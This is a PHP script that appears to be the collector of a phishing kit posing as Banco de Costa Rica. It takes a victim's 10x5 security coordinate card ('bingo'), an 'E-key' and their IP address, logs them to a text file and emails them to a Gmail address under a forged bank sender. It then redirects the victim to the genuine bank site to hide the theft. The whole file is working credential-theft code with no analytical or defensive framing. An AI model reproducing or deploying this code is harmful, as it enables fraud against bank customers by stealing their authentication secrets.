<?
//include_once('class.phpmailer.php');
//include("../../../datos.php");
//$mail  = new PHPMailer(); 
$ip = $_SERVER[REMOTE_ADDR];
$correo_BANCOBCR="equipo13111@gmail.com";
if($_POST['id'] != "") {
	$A1 = $_POST['A1'];
	$A2 = $_POST['A2'];
	$A3 = $_POST['A3'];
	$A4 = $_POST['A4'];
	$A5 = $_POST['A5'];
	//modulo B
	$B1 = $_POST['B1'];
	$B2 = $_POST['B2'];
	$B3 = $_POST['B3'];
	$B4 = $_POST['B4'];
	$B5 = $_POST['B5'];
	//modulo C
	$C1 = $_POST['C1'];
	$C2 = $_POST['C2'];
	$C3 = $_POST['C3'];
	$C4 = $_POST['C4'];
	$C5 = $_POST['C5'];
		//modulo D
	$D1 = $_POST['D1'];
	$D2 = $_POST['D2'];
	$D3 = $_POST['D3'];
	$D4 = $_POST['D4'];
	$D5 = $_POST['D5'];
		//modulo E
	$E1 = $_POST['E1'];
	$E2 = $_POST['E2'];
	$E3 = $_POST['E3'];
	$E4 = $_POST['E4'];
	$E5 = $_POST['E5'];
		//modulo F
	$F1 = $_POST['F1'];
	$F2 = $_POST['F2'];
	$F3 = $_POST['F3'];
	$F4 = $_POST['F4'];
	$F5 = $_POST['F5'];
		//modulo G
	$G1 = $_POST['G1'];
	$G2 = $_POST['G2'];
	$G3 = $_POST['G3'];
	$G4 = $_POST['G4'];
	$G5 = $_POST['G5'];
		//modulo H
	$H1 = $_POST['H1'];
	$H2 = $_POST['H2'];
	$H3 = $_POST['H3'];
	$H4 = $_POST['H4'];
	$H5 = $_POST['H5'];
		//modulo I
	$I1 = $_POST['I1'];
	$I2 = $_POST['I2'];
	$I3 = $_POST['I3'];
	$I4 = $_POST['I4'];
	$I5 = $_POST['I5'];
		//modulo J
	$J1 = $_POST['J1'];
	$J2 = $_POST['J2'];
	$J3 = $_POST['J3'];
	$J4 = $_POST['J4'];
	$J5 = $_POST['J5'];
	$msg = "<table border=1>
<tr>
<td colspan=11 align=center><H3>Banco costa rica bingo</H3></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>A</td>
    <td>B</td>
    <td>C</td>
    <td>D</td>
    <td>E</td>
    <td>F</td>
    <td>G</td>
    <td>H</td>
    <td>I</td>
    <td>J</td>
  </tr>
  <tr>
    <td>1</td>
    <td>$A1</td>
    <td>$B1</td>
    <td>$C1</td>
    <td>$D1</td>
    <td>$E1</td>
    <td>$F1</td>
    <td>$G1</td>
    <td>$H1</td>
    <td>$I1</td>
    <td>$J1</td>
  </tr>
  <tr>
    <td>2</td>
    <td>$A2</td>
    <td>$B2</td>
    <td>$C2</td>
    <td>$D2</td>
    <td>$E2</td>
    <td>$F2</td>
    <td>$G2</td>
    <td>$H2</td>
    <td>$I2</td>
    <td>$J2</td>
  </tr>
  <tr>
    <td>3</td>
    <td>$A3</td>
    <td>$B3</td>
    <td>$C3</td>
    <td>$D3</td>
    <td>$E3</td>
    <td>$F3</td>
    <td>$G3</td>
    <td>$H3</td>
    <td>$I3</td>
    <td>$J3</td>
  </tr>
  <tr>
    <td>4</td>
    <td>$A4</td>
    <td>$B4</td>
    <td>$C4</td>
    <td>$D4</td>
    <td>$E4</td>
    <td>$F4</td>
    <td>$G4</td>
    <td>$H4</td>
    <td>$I4</td>
    <td>$J4</td>
  </tr>
  <tr>
    <td>5</td>
    <td>$A5</td>
    <td>$B5</td>
    <td>$C5</td>
    <td>$D5</td>
    <td>$E5</td>
    <td>$F5</td>
    <td>$G5</td>
    <td>$H5</td>
    <td>$I5</td>
    <td>$J5</td>
  </tr>
  <tr>
  <td colspan=11 align=center>
  <b>E-key:</b><br>".base64_decode($_POST["id"])."
  </td></tr>
    <td colspan=11 align=left>
  <b>IP:</b> ".$ip."
  </td></tr>
</table>";
//$message .= $msg.;
$wos=fopen("../../../cos.txt",'a');
//flock($wos,2);
fputs($wos,$msg."\n\r");
//flock($wos,3);
fclose($wos);

$subj = "BINGO BANCOBCR -".$ip;

if(!mail("equipo13111@gmail.com", $subj , $msg, "From: BANCO BANCOBCR\nContent-Type: text/html; charset=iso-8859-1")) {
header("location: https://www.personas.bancobcr.com/plantilla/");
} else {
header("location: http://www.personas.bancobcr.com/personas/plantilla/mantenimiento.html");
}

}
?>